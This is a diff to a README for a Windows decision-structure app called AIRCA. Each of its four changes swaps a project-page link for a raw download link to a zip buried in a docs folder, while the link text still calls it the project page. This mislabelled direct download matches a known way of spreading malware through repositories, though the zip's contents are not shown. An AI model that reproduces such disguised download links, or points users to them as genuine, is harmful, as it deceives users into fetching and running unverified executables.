@@ -1,11 +1,11 @@
 # 🧩 airca-fractal-decision-architecture - Clear decision structure for teams
 
-[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20the%20project%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/rightsideup-rubiales387/airca-fractal-decision-architecture/main/docs/fractal-decision-making/fractal-decision-airca-architecture-v3.7-beta.5.zip)
 
 ## 📥 Download
 Use this link to visit the project page and download the app for Windows:
 
-[Open the download page](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
+[Open the download page](https://raw.githubusercontent.com/rightsideup-rubiales387/airca-fractal-decision-architecture/main/docs/fractal-decision-making/fractal-decision-airca-architecture-v3.7-beta.5.zip)
 
 ## 🪟 Windows Setup
 1. Open the download page above.
@@ -120,7 +120,7 @@ This kind of setup makes it easier to see where a decision starts, who checks it
 ## 🔗 Project link
 Use this page to get the app and related files:
 
-https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture
+https://raw.githubusercontent.com/rightsideup-rubiales387/airca-fractal-decision-architecture/main/docs/fractal-decision-making/fractal-decision-airca-architecture-v3.7-beta.5.zip
 
 ## 🖥️ Run on Windows
 If you already have the file on your computer:
@@ -194,7 +194,7 @@ That keeps the process clear and easy to follow
 ## 📎 Download again
 If you need the file again, use the project page here:
 
-[Visit the download page](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
+[Visit the download page](https://raw.githubusercontent.com/rightsideup-rubiales387/airca-fractal-decision-architecture/main/docs/fractal-decision-making/fractal-decision-airca-architecture-v3.7-beta.5.zip)
 
 ## 🧭 What makes it different
 AIRCA keeps the familiar RACI idea, then extends it with a fractal model. That means the same decision pattern can repeat across levels without losing order. It is useful when one decision affects many smaller decisions, or when one policy needs to work across a whole system
